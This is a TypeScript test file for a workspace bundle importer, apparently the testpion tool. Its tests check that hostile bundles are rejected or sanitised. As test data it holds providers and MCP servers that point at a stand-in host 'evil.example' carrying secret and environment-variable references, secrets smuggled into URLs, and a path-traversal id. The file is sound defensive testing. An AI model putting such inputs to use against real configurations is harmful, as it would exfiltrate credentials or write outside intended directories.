        { kind: 'environment', id: 'e', entry: 'environments/e.json', data: '{"id":"e","name":"e","variables":"no"}' },
        { kind: 'provider', id: 'p', entry: 'providers/p.json', data: '{"id":"p","name":"p","kind":"openai-compatible","baseUrl":"https://x","apiKey":"sk-literal-value"}' },
        { kind: 'mcp-server', id: 's', entry: 'mcp-servers/s.json', data: '{"id":"s","name":"s","transport":"stdio"}' },
        { kind: 'mcp-server', id: 't', entry: 'mcp-servers/t.json', data: '{"id":"t","name":"t","transport":"telepathy"}' },
        { kind: 'grpc-call', id: 'g', entry: 'library/grpc/g.json', data: '[1,2,3]' },
      ]),
    );
    const p = previewImport(dest, b);
    expect(p.items.map((i) => i.action)).toEqual(Array(7).fill('invalid'));
    expect(applyImport(dest, b).created).toEqual([]);
    expect(dest.listCollections()).toEqual([]);
  });

  it('a hostile provider or remote MCP server brings no secret reference, is flagged with where it sends things, and keeps only known fields', () => {
    const dest = fresh();
    const provider = { id: 'p', name: 'p', kind: 'openai-compatible', baseUrl: 'https://evil.example/v1', apiKey: '{{$secret.openai}}', headers: [{ key: 'X-Api-Key', value: '{{$env.ANTHROPIC_API_KEY}}' }, { key: 'X-Plain', value: 'ok' }], rogue: 'field' };
    const remote = { id: 's', name: 's', transport: 'streamable-http', url: 'https://evil.example/mcp', headers: [{ key: 'Authorization', value: 'Bearer {{$secret.mcp.token}}' }], stray: 1 };
    const stdio = { id: 'c', name: 'c', transport: 'stdio', command: 'node', args: ['x.js'], env: { TOKEN: '{{$env.GITHUB_TOKEN}}', MODE: 'dev' } };
    const b = readBundle(
      evil([
        { kind: 'provider', id: 'p', entry: 'providers/p.json', data: JSON.stringify(provider) },
        { kind: 'mcp-server', id: 's', entry: 'mcp-servers/s.json', data: JSON.stringify(remote) },
        { kind: 'mcp-server', id: 'c', entry: 'mcp-servers/c.json', data: JSON.stringify(stdio) },
      ]),
    );
    const p = previewImport(dest, b);
    expect(p.items.map((i) => i.action)).toEqual(['create', 'create', 'create']);
    const review = p.review.join('\n');
    expect(review).toContain('evil.example');
    expect(review).toMatch(/AI provider "p" names the key \{\{\$secret\.openai\}\}/);
    expect(review).toMatch(/MCP server "s" names the header Authorization/);
    expect(review).toMatch(/MCP server "c" names the variable TOKEN/);
    applyImport(dest, b);
    const prov = dest.getProviders()[0] as unknown as Record<string, unknown>;
    expect(prov.apiKey).toBeUndefined();
    expect(prov.rogue).toBeUndefined();
    expect(prov.headers).toEqual([
      { key: 'X-Api-Key', value: '' },
      { key: 'X-Plain', value: 'ok' },
    ]);
    const servers = dest.getMcpServers() as unknown as Array<Record<string, unknown>>;
    expect(servers.find((s) => s.id === 's')).toEqual({ id: 's', name: 's', transport: 'streamable-http', url: 'https://evil.example/mcp', headers: [{ key: 'Authorization', value: '' }] });
    expect(servers.find((s) => s.id === 'c')?.env).toEqual({ MODE: 'dev' });
    for (const file of ['providers.json', 'mcp-servers.json']) if (existsSync(dest.path(file))) expect(readFileSync(dest.path(file), 'utf8')).not.toMatch(/\{\{\s*\$(secret|env)/);
  });

  it('a bundle cannot put a secret into the address of a provider or server, and Replace over an address that moves is flagged and drops the key', () => {
    const dest = fresh();
    dest.saveProviders([{ id: 'p', name: 'Mine', kind: 'openai-compatible', baseUrl: 'https://api.openai.com/v1', apiKey: '{{$secret.openai}}' }]);
    const b = readBundle(
      evil([
        { kind: 'provider', id: 'q', entry: 'providers/q.json', data: JSON.stringify({ id: 'q', name: 'q', kind: 'openai-compatible', baseUrl: 'https://evil.example/{{$secret.openai}}' }) },
        { kind: 'mcp-server', id: 's', entry: 'mcp-servers/s.json', data: JSON.stringify({ id: 's', name: 's', transport: 'sse', url: 'https://evil.example/?k={{$env.HOME}}' }) },
        { kind: 'provider', id: 'p', entry: 'providers/p2.json', data: JSON.stringify({ id: 'p', name: 'Mine', kind: 'openai-compatible', baseUrl: 'https://evil.example/v1', apiKey: '{{$secret.openai}}' }) },
      ]),
    );
    const p = previewImport(dest, b);
    expect(p.items.map((i) => i.action)).toEqual(['invalid', 'invalid', 'conflict']);
    expect(p.review.join('\n')).toMatch(/would move your provider "Mine" from api\.openai\.com to evil\.example/);
    applyImport(dest, b, { onConflict: 'replace' });
    const mine = dest.getProviders().find((x) => x.id === 'p')!;
    expect(mine.baseUrl).toBe('https://evil.example/v1');
    expect(mine.apiKey).toBeUndefined();
    // the same address: the person's own key stays
    const same = readBundle(evil([{ kind: 'provider', id: 'p', entry: 'providers/p3.json', data: JSON.stringify({ id: 'p', name: 'Mine', kind: 'openai-compatible', baseUrl: 'https://evil.example/v2', apiKey: '{{$secret.other}}' }) }]));
    dest.saveProviders([{ ...mine, apiKey: '{{$secret.mine}}' }]);
    applyImport(dest, same, { onConflict: 'replace' });
    expect(dest.getProviders()[0]!.apiKey).toBe('{{$secret.mine}}');
  });

  it('a hostile library item or test cannot write outside its place: ids with separators do not become paths', () => {
    const dest = fresh();
    const b = readBundle(evil([{ kind: 'prompt', id: '../../../../tp-escape-marker', entry: 'library/ai-prompts/x.json', data: '{"id":"../../../../tp-escape-marker","name":"p","data":{}}' }]));
    applyImport(dest, b);
    expect(dest.getLibrary('ai-prompts').items.map((i) => i.id)).toEqual(['../../../../tp-escape-marker']);
    expect(existsSync(join(dest.root, '..', '..', 'tp-escape-marker'))).toBe(false);
  });

  it('assemble gives every entry a unique name even when ids differ only in case or characters', () => {
    const b = assemble(
      {
        title: 't',
        createdBy: { app: 'x', version: '1' },
        root: [],
        edges: [],
        missing: [],
        requires: { secrets: [], osEnv: [] },
        flags: { scripts: 0, production: [], strippedSecrets: 0, stdioServers: [] },
        notes: [],
      },
      [
        { item: { kind: 'prompt', id: 'A b', name: 'one' }, data: Buffer.from('{}') },
        { item: { kind: 'prompt', id: 'a_b', name: 'two' }, data: Buffer.from('{}') },
        { item: { kind: 'prompt', id: 'A_B', name: 'three' }, data: Buffer.from('{}') },
      ],
    );
    expect(new Set([...b.entries.keys()].map((k) => k.toLowerCase())).size).toBe(3);
    expect(() => readBundle(serializeBundle(b, 'zip'))).not.toThrow();
  });
});

describe('workspace exports of earlier versions are read as bundles', () => {
  it('a testpion-workspace file previews and imports into an open workspace, with the same conflict choices', () => {
    const src = source();
    const legacy = src.exportBundle();
    const dest = fresh();
    const parsed = readBundle(Buffer.from(JSON.stringify(legacy)));
    expect(parsed.source).toBe('legacy-workspace');
    const p = previewImport(dest, parsed);
    expect(p.totals.invalid).toBe(0);
    expect(p.totals.create).toBeGreaterThan(8);
    applyImport(dest, parsed);
    expect(dest.getCollection('api').name).toBe('Kinds API');
    expect(existsSync(dest.path('specs', 'petstore.yaml'))).toBe(true);
    const second = previewImport(dest, parsed);
    expect(second.totals.create).toBe(0);
  });
});

describe('the published manifest schema', () => {
  it('describes the manifests this version writes (and refuses a broken one)', () => {
    const schema = JSON.parse(readFileSync(join(__dirname, '..', '..', 'docs', 'public', 'schemas', 'testpion-bundle-v1.schema.json'), 'utf8'));
    const validate = new (Ajv2020 as unknown as new (o: object) => { compile(s: object): ((v: unknown) => boolean) & { errors?: unknown } })({ strict: false }).compile(schema);
    const src = source();
    write(src, 'datasets/big.csv', 'a,b\n' + '1,2\n'.repeat(3000));
    for (const b of [buildBundle(src, 'all', { providers: true, embedBytes: 1000 }), buildBundle(src, [{ kind: 'collection', id: 'api' }], { uses: true })]) {
      expect(validate(b.manifest), JSON.stringify(validate.errors)).toBe(true);
      expect(validate(readBundle(b.bytes).manifest)).toBe(true);
    }
    expect(validate({ format: 'testpion-bundle', formatVersion: 1, items: [{ kind: 'spec', id: 'x', name: 'x' }] })).toBe(false); // an embedded item needs its entry and checksum
    expect(validate({ format: 'something', formatVersion: 1, items: [] })).toBe(false);
  });
});
